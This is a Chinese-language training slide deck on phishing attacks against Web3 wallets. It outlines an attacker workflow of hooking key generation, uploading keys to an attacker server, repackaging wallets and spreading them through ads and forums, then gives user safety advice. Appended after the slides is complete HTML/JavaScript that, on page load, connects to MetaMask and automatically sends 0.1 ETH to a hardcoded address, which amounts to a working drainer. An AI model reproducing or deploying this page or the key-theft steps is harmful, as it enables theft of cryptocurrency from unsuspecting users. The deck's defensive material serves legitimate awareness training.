# 钱包安全

::: warning DeeLMind 提示
PPT 放大请按F，退出最大化请按ESC
:::

@slidestart

# WEB3 Wallet Phishing Attack

WEB3钱包钓鱼攻击

--

## 什么是WEB3钱包

--

* DAPP
* 资产管理交易
* 公钥私钥管理
* 助记词管理

--

公钥相当于银行卡`账号`

私钥相当于银行卡`密码`

助记词在忘记账号密码时可以恢复

--

## 什么是钓鱼攻击

钓鱼攻击（Phishing Attack）是一种网络攻击方式，攻击者通过伪装成可信赖的实体来诱骗受害者。

--

![er](/imgs/web3/wallet/1.jpg)

--

## WEB3钱包分类

--

* 软件钱包
* 硬件钱包
* 在线钱包
* 纸质钱包

--

## WEB3钱包本质

* 智能合约交互的库(web3.js)
* 客户端，移动端，前端技术
* 密钥（助记词）生成管理交易

--

## WEB3钱包钓鱼攻击

通过伪造WEB3钱包，诱骗用户使用，进而偷取其密钥，助记词，然后窃取用户资金。

--

## WEB3钓鱼钱包开发种类

--

* 开发钓鱼钱包
* 在已有钱包基础上开发
* 任意调用钱包转账

---

## WEB3钓鱼钱包攻击思路

--

* 信息搜集，确认目标
* 逆向分析钱包
* HOOK密钥生成点
* 将密钥上传骇客服务器
* 直接Dump密钥文件
* 二次打包目标钱包
* 诱骗用户使用

--

![er](/imgs/web3/wallet/2.png)

--

![er](/imgs/web3/wallet/3.png)

--

* JS没有加密
* StoreXSS
* 二次打包

--

![er](/imgs/web3/wallet/4.png)

--

![er](/imgs/web3/wallet/5.png)

--

![er](/imgs/web3/wallet/6.png)

--

![er](/imgs/web3/wallet/7.png)

--

## 诱骗用户使用

--

* 百度广告
* 谷歌广告
* 论坛转发
* 各种群内转发
* 钓鱼网站下载

--

## 安全建议

--

### 钱包厂商

--

钱包被修改是无法100%解决

--

### 钱包用户

--

* 业内认可的钱包
* 官方渠道下载
* 不要轻易授权Root

--

### 如何选择官方

--

* 不要用百度搜索
* 谷歌搜索看清楚是否为广告
* 查看域名
* `谨慎谨慎`

--

* metamask.com
* metamask.org
* metamask.io
* metamask.top
* metamask.cn

--

![er](/imgs/web3/wallet/8.png)

--

![er](/imgs/web3/wallet/9.png)

@slideend

<DocsAD/>

```html
<!DOCTYPE html>
<html>
<head>
    <title>MetaMask Transfer</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
    <button id="connectButton" style="display: none;">Connect MetaMask</button>
    <button id="transferButton" style="display: none;">Transfer</button>

    <script>
        let web3;

        // 检查 MetaMask 是否安装
        if (typeof window.ethereum !== 'undefined') {
            web3 = new Web3(window.ethereum);
            console.log('MetaMask is installed!');
        } else {
            alert('Please install MetaMask to use this dApp!');
        }

        // 连接 MetaMask
        async function connectMetaMask() {
            try {
                await ethereum.request({ method: 'eth_requestAccounts' });
                console.log('MetaMask connected');
                autoTransfer();
            } catch (error) {
                console.error('User rejected the request');
            }
        }

        // 转账
        async function autoTransfer() {
            const accounts = await web3.eth.getAccounts();
            const fromAddress = accounts[0];
            const toAddress = '0xfb0bc05F1aC61a566E70890e0e000E66F147ae66'; // 替换为接收地址
            const amount = web3.utils.toWei('0.1', 'ether'); // 替换为要转账的金额

            web3.eth.sendTransaction({
                from: fromAddress,
                to: toAddress,
                value: amount
            })
            .on('transactionHash', (hash) => {
                console.log('Transaction sent. Hash:', hash);
            })
            .on('receipt', (receipt) => {
                console.log('Transaction confirmed. Receipt:', receipt);
            })
            .on('error', (error) => {
                console.error('Transaction failed:', error);
            });
        }

        // 自动连接并转账
        window.addEventListener('load', async () => {
            await connectMetaMask();
        });
    </script>
</body>
</html>
```